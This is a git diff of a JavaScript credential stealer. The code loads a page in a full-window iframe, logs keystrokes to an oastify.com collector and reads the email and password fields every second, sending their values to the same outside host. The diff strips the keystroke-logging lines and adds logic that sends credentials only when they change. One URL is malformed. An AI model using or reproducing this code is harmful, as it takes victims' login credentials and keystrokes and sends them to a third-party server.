@@ -8,19 +8,24 @@ iframe.height = '100%';
 iframe.style.border = 'none';
 iframe.onload = function () {
     console.log('Iframe has loaded successfully!');
-    iframe.contentWindow.addEventListener('keydown', (event) => {    console.log(`Key pressed: ${event.key}`);
-    currSession += `+${String(event.key)}`
+    iframe.contentWindow.addEventListener('keydown', (event) => {
     fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${currSession}`, {mode: 'no-cors',});
 });
 };
 document.body.appendChild(iframe);
 //=================================================================================
 
+let old_username = ""
+let old_password = ""
 setInterval(()=> {
     const iframe = document.querySelector('iframe');
     const element = iframe.contentDocument.evaluate('/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input', iframe.contentDocument, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
-    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`, {mode: 'no-cors'})
-    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${iframe.contentDocument.getElementById('password').value }`, {mode: 'no-cors'})
+    if (element.value != old_username || iframe.contentDocument.getElementById('password').value !=  old_password) {
+        fetch(`https:a//4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`)
+        fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${iframe.contentDocument.getElementById('password').value }`)
+        old_username = element.value;
+        old_password = iframe.contentDocument.getElementById('password').value;
+    }    
 }, 1000)
 
 
